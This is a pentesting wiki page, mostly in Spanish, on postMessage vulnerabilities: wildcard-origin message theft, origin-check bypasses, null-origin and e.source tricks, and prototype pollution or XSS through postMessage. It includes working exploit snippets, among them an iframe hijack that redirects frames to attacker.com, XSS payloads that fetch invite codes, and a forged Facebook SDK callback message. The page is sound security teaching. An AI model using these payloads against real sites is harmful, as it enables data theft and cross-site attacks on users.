# PostMessage Vulnerabilities

{{#include ../../banners/hacktricks-training.md}}

## Enviar **PostMessage**

**PostMessage** utiliza la siguiente función para enviar un mensaje:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Ten en cuenta que **targetOrigin** puede ser un '\*' o una URL como _https://company.com._\
En el **segundo escenario**, el **mensaje solo puede enviarse a ese dominio** (incluso si el origen del objeto Window es diferente).\
Si se usa el **wildcard**, **los mensajes podrían enviarse a cualquier dominio**, y serán enviados al origen del objeto Window.

### Atacando iframe & wildcard en **targetOrigin**

Como se explica en [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) si encuentras una página que puede ser **iframed** (sin protección `X-Frame-Header`) y que está **enviando mensajes sensibles** vía **postMessage** usando un **wildcard** (\*), puedes **modificar** el **origen** del **iframe** y **leak** el **mensaje sensible** a un dominio controlado por ti.\
Ten en cuenta que si la página puede ser iframed pero el **targetOrigin** está **establecido en una URL y no en un wildcard**, este **truco no funcionará**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Explotación de addEventListener

**`addEventListener`** es la función usada por JS para declarar la función que está **esperando `postMessages`**.\
Se usará un código similar al siguiente:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeración

In order to **find event listeners** in the current page you can:

- **Search** the JS code for `window.addEventListener` and `$(window).on` (_JQuery version_)
- **Execute** in the developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Go to** _Elements --> Event Listeners_ in the developer tools of the browser

![](<../../images/image (396).png>)

- Use a **browser extension** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). This browser extensions will **intercept all the messages** and show them to you.

### Origin check bypasses

- **`event.isTrusted`** attribute is considered secure as it returns `True` only for events that are generated by genuine user actions. Though it's challenging to bypass if implemented correctly, its significance in security checks is notable.
- The use of **`indexOf()`** for origin validation in PostMessage events may be susceptible to bypassing. An example illustrating this vulnerability is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- The **`search()`** method from `String.prototype.search()` is intended for regular expressions, not strings. Passing anything other than a regexp leads to implicit conversion to regex, making the method potentially insecure. This is because in regex, a dot (.) acts as a wildcard, allowing for bypassing of validation with specially crafted domains. For instance:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- The **`match()`** function, similar to `search()`, processes regex. If the regex is improperly structured, it might be prone to bypassing.
- The **`escapeHtml`** function is intended to sanitize inputs by escaping characters. However, it does not create a new escaped object but overwrites the properties of the existing object. This behavior can be exploited. Particularly, if an object can be manipulated such that its controlled property does not acknowledge `hasOwnProperty`, the `escapeHtml` won't perform as expected. This is demonstrated in the examples below:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

In the context of this vulnerability, the `File` object is notably exploitable due to its read-only `name` property. This property, when used in templates, is not sanitized by the `escapeHtml` function, leading to potential security risks.

- The `document.domain` property in JavaScript can be set by a script to shorten the domain, allowing for more relaxed same-origin policy enforcement within the same parent domain.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Puedes forzar que **`e.source`** de un mensaje sea null creando un **iframe** que **envía** el **postMessage** y se **elimina inmediatamente**.

Para más información **lee:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Para realizar estos ataques idealmente podrás **colocar la página web víctima** dentro de un `iframe`. Pero algunos headers como `X-Frame-Header` pueden **impedir** ese **comportamiento**.\
En esos escenarios aún puedes usar un ataque menos sigiloso. Puedes abrir una nueva pestaña a la aplicación web vulnerable y comunicarte con ella:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Robar el mensaje enviado al iframe hijo bloqueando la página principal

En la página siguiente puedes ver cómo podrías robar **datos sensibles de postmessage** enviados a un **iframe hijo** bloqueando la **página principal** antes de enviar los datos y abusando de una **XSS en el hijo** para **leak** los datos antes de que sean recibidos:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Robar el mensaje modificando la ubicación del iframe

Si puedes embeber una página web en un iframe sin X-Frame-Header que contiene otro iframe, puedes **cambiar la ubicación de ese iframe hijo**, así que si está recibiendo un **postmessage** enviado usando un **wildcard**, un atacante podría **cambiar** el **origin** de ese iframe a una página **controlada** por él y **robar** el mensaje:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage a Prototype Pollution y/o XSS

En escenarios donde los datos enviados mediante `postMessage` son ejecutados por JS, puedes **iframe** la **página** y **explotar** la **prototype pollution/XSS** enviando el exploit vía `postMessage`.

Un par de **XSS muy bien explicadas a través de `postMessage`** se pueden encontrar en [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Ejemplo de un exploit para abusar de **Prototype Pollution y luego XSS** mediante un `postMessage` a un `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Para **más información**:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Predicción de tokens de callback de **`Math.random()`** en puentes postMessage

Cuando la validación de mensajes usa un “shared secret” generado con `Math.random()` (p. ej., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) y el mismo helper también nombra iframes de plugins, puedes recuperar salidas del PRNG y forjar mensajes confiables:

- **Leak PRNG outputs via `window.name`:** El SDK auto-nombra los iframes de plugins con `guid()`. Si controlas el top frame, iframea la página víctima, luego navega el iframe del plugin a tu origin (p. ej., `window.frames[0].frames[0].location='https://attacker.com'`) y lee `window.frames[0].frames[0].name` para obtener un valor bruto de `Math.random()`.
- **Forzar más valores sin recargas:** Algunos SDKs exponen una ruta de reinit; en el FB SDK, disparar `init:post` con `{xfbml:1}` fuerza `XFBML.parse()`, destruye/crea de nuevo el iframe del plugin y genera nuevos nombres/IDs de callback. Repetir la reinit produce tantos valores del PRNG como se necesiten (ten en cuenta llamadas internas adicionales a `Math.random()` para IDs de callback/iframe, por lo que los solucionadores deben saltarse valores intermedios).
- **Trusted-origin delivery via parameter pollution:** Si un endpoint first-party del plugin refleja un parámetro no saneado dentro de la payload entre ventanas (p. ej., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), puedes inyectar `&type=...&iconSVG=...` manteniendo el origin de confianza `facebook.com`.
- **Predecir el siguiente callback:** Convierte los iframe names leaked de vuelta a floats en `[0,1)` y alimenta varios valores (incluso no consecutivos) a un predictor de `Math.random` de V8 (p. ej., basado en Z3). Genera el siguiente `guid()` localmente para falsificar el token de callback esperado.
- **Disparar el sink:** Crea los datos de postMessage de manera que el bridge despache `xd.mpn.setupIconIframe` e inyecte HTML en `iconSVG` (p. ej., URL-encoded `<img src=x onerror=...>`), consiguiendo DOM XSS dentro del origin anfitrión; desde ahí, se pueden leer iframes same-origin (OAuth dialogs, arbiters, etc.).
- **Las peculiaridades del framing ayudan:** La cadena requiere framing. En algunos webviews móviles, `X-Frame-Options` puede degradarse a `ALLOW-FROM` no soportado cuando `frame-ancestors` está presente, y parámetros “compat” pueden forzar `frame-ancestors` permisivos, habilitando the `window.name` side channel.

#### Ejemplo mínimo de mensaje falsificado
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referencias

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Para practicar: [https://github.com/yavolo/eventlistener-xss-recon]
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
